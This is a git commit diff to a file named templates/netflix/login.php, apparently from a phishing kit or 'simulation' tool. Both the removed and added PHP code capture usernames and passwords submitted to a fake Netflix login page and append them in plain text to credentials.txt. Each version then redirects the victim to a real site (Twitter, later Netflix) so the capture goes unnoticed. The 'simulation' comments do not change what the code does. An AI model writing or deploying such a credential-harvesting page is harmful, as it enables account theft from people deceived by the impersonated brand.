bd6f7f0f4b3882134127b2964f6bd458540bd09b
kipkorirCal <kipkoric@mail.gvsu.edu>
2025-04-12 23:53:59 -0400

    Update login.php

--- templates/netflix/login.php
+++ templates/netflix/login.php
@@ -1,5 +1,13 @@
 <?php
-file_put_contents("credentials.txt", "User: " . $_POST['username'] . " | Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://twitter.com');
-exit();
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = htmlspecialchars($_POST['username']);
+    $password = htmlspecialchars($_POST['password']);
+    
+    // For simulation: Log to a file
+    file_put_contents("credentials.txt", "User: $username | Pass: $password\n", FILE_APPEND);
+    
+    // Simulate redirection
+    header("Location: https://www.netflix.com");
+    exit();
+}
 ?>
